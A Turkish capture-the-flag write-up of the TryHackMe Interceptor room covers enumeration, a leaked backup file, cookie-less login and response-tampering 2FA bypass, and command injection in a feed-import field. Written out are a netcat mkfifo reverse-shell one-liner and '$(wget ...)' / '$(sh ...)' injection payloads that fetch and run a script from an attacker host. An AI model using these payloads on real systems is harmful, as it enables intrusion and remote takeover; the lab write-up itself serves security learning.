# TryHackMe - Interceptor Writeup

## Keşif

İlk olarak nmap taraması ile başlıyoruz:

```bash
nmap -sS -A -p- 10.112.165.37
```
<img width="826" height="610" alt="nmap" src="https://github.com/user-attachments/assets/965f4008-65f8-4b1b-8145-94acbfacbe42" />

Taramada **22, 80, 53** portlarının açık olduğunu gördüm. 22 ve 53 şimdilik işe yarar görünmüyordu, o yüzden direkt web tarafına yöneldim. Siteye gittiğimde karşımda sade bir login sayfası vardı, başka bir şey görünmüyordu.

---

## Dizin Taraması

Login olmadan erişebileceğim bir şey var mı diye ffuf ile dizin taraması denedim:

```bash
ffuf -u http://10.112.165.37/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Ama garip bir şey oldu — denediğim her dizin **200 OK** dönüyordu. Bu genelde bir wildcard response olduğunun işareti, yani sunucu var olmayan her dizin için de aynı sayfayı döndürüyor. Bunu doğrulamak için rastgele bir dizine (`/test`) curl attım ve dönen response'un uzunluğunun **1491** olduğunu gördüm. Demek ki bu, "bulunamadı" sayfasının sabit boyutuydu. ffuf'a bu boyuttaki response'ları filtrelemesini söyledim:

```bash
ffuf -u http://10.112.165.37/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 1491
```

Bu sefer gerçek sonuçlar geldi:

<img width="1122" height="497" alt="ffuf" src="https://github.com/user-attachments/assets/067aaec8-5f0a-4920-aae1-7f0d35d7bc63" />

Ama bir tuhaflık vardı: listede `login.php` yoktu, oysa siteyi ziyaret ettiğimde bir login sayfası görmüştüm. Demek ki normal wordlist bunu yakalayamıyordu. Bunun üzerine taramayı dosya uzantılarına göre genişlettim — belki dosyanın kendisi değil, bir yedeği/eski hali duruyordu:

```bash
ffuf -u http://10.112.165.37/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 1491 -e .php,.php.bak,.php.old,.php.save,.php.swp,.php~,,.bak,.old,.orig,.save,.swp,.log,.conf,.config,.sql,.sql.bak,.sql.old,.tar,.tar.gz,.tgz,.zip,.7z
```

Bu sefer **`login.php.bak`** dosyasını buldum. Bu, geliştiricinin production'a almayı unuttuğu bir yedek dosyaydı.

<img width="774" height="259" alt="ffuf2" src="https://github.com/user-attachments/assets/e1d49275-58fe-406d-8dd8-68f130cd3bda" />

---

## Backup Dosyası Sızıntısı

`login.php.bak` dosyasına giderek indirdim ve içeriğini okudum:

```bash
cat login.php.bak
```
<img width="785" height="324" alt="loginphpbak" src="https://github.com/user-attachments/assets/aa587298-8285-4008-b0d0-95270dbe416f" />

Bu not bana iki şey verdi: admin hesabının **e-posta adresi** ve şirketin parola formatı hakkında bir ipucu. Parolayı tahmin etmeye çalışmadan önce, elimdeki daha zayıf halkayı denemeye karar verdim.

---

## Burp Suite ile Auth Bypass

Login sayfasına elimdeki e-posta ile bir istek gönderip Burp Suite ile yakaladım. İsteği incelerken, session/cookie bilgisini isteğin üzerinden silip tekrar gönderdim. Beklenmedik şekilde sunucu şu cevabı döndü:

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

Yani kimlik doğrulama, cookie olmadan da "başarılı" dönebiliyordu — bu da uygulamanın session kontrolünde ciddi bir mantık hatası olduğunu gösteriyordu. Yönlendirilen `otp.php` sayfasına gittim:

```
http://10.112.165.37/otp.php
```

Karşıma **Two Factor Verification** ekranı çıktı, 6 haneli bir kod istiyordu.

---

## OTP Bypass

OTP alanına rastgele bir değer (`111111`) girip isteği yine Burp ile yakaladım. Sunucudan gelen cevap şuydu:

```json
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

Response içinde `is_verified` diye bir alan dikkatimi çekti. Bu, client tarafına geri dönen ve muhtemelen uygulama mantığında referans alınan bir değerdi. Bu değeri response üzerinde elle `true` yaparak isteği tekrar gönderdim. Birkaç denemeden sonra bu şekilde girişi tamamlamayı başardım ve panele erişim sağladım.

```
flag: THM{ADMIN_ACCESS_USING_BURP}
```

---

## Import Feed - Command Injection ile Shell

Panelde **"Import Feed"** adında bir özellik vardı:

```
Paste a valid RSS/Atom feed URL. The server fetches it and returns the raw output.
If the server has no internet, you'll see: Internet not connected.
```

Yani bu özellik, verdiğim URL'yi sunucu tarafında çekip sonucu bana gösteriyordu. Bu tarz "sunucu senin adına bir URL'ye istek atsın" özellikleri her zaman command injection ihtimaline karşı test etmeye değer.

Önce kendi makinemde bir reverse shell script'i hazırladım:

```bash
nano shell.sh
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.154.242 4444 >/tmp/f
```

Sonra bunu hedefin erişebileceği şekilde kendi makinemde servis olarak yayınladım:

```bash
python3 -m http.server 8000
```

Feed URL alanına, sunucunun bu script'i indirmesini sağlayacak bir **command substitution** payload'ı verdim:

```
http://$(wget http://192.168.154.242:8000/shell.sh)
```

Sayfa `curl: (3) URL using bad/illegal format or missing URL` hatası döndürse de, bu aslında normaldi — çünkü `$()` içindeki komut zaten çalışmış ve `shell.sh` dosyası hedef sunucuya inmişti. Hata mesajı sadece geri kalan (artık anlamsız) URL'nin curl tarafından reddedilmesinden kaynaklanıyordu.

Ardından indirilen dosyayı çalıştırmak için aynı yöntemi tekrar kullandım:

```
http://$(sh shell.sh)
```

Bu istek gönderildiğinde listener tarafında reverse shell'i yakaladım.

*(Ekran görüntüsü buraya: `screenshots/shell-alindi.png`)*

---

## Flag

Görev, `/var/www/user.txt` dosyasının içeriğini bulmamı istiyordu. Shell üzerinden dosyayı okudum:

```bash
cat /var/www/user.txt
```

```
THM{SYSTEM_PWNED_SUCCESSFULLY}
```

---

## Özet

| Aşama | Kullanılan Teknik |
|---|---|
| Keşif | Nmap full port scan |
| Dizin Taraması | ffuf ile wildcard response filtreleme, uzantı bazlı fuzzing |
| Bilgi Sızıntısı | Unutulmuş `login.php.bak` yedek dosyası |
| Auth Bypass | Burp Suite ile cookie'siz login isteği |
| 2FA Bypass | Response üzerinde `is_verified` değerinin manipülasyonu |
| Uzaktan Kod Çalıştırma | "Import Feed" özelliğinde command substitution ile injection |
| Root/Sistem Erişimi | Reverse shell ile flag dosyasına erişim |

Interceptor, tek bir büyük açıktan çok, arka arkaya zincirlenen küçük hataların (unutulmuş backup dosyası, zayıf session kontrolü, güvenilmeyen client-side response alanı, sanitize edilmemiş URL girdisi) bir araya gelince neye dönüşebileceğini gösteren güzel bir kutuydu.

---

*Bu writeup TryHackMe Interceptor odası için hazırlanmıştır.*
